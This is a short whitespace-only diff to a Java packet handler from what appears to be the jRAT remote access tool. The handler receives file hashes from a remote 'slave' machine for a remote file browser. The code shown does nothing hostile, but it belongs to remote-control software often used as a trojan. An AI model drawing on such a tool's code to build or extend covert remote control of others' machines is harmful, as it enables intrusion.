@@ -7,15 +7,13 @@ import javax.swing.JOptionPane;
 import pro.jrat.Slave;
 import pro.jrat.ui.frames.FrameRemoteFiles;
 
-
-
 public class Packet46FileHash extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		final String md5 = slave.readLine();
 		final String sha1 = slave.readLine();
-		
+
 		FrameRemoteFiles frame = FrameRemoteFiles.instances.get(slave);
 		if (frame != null) {
 			if (frame.waitingForMd5) {
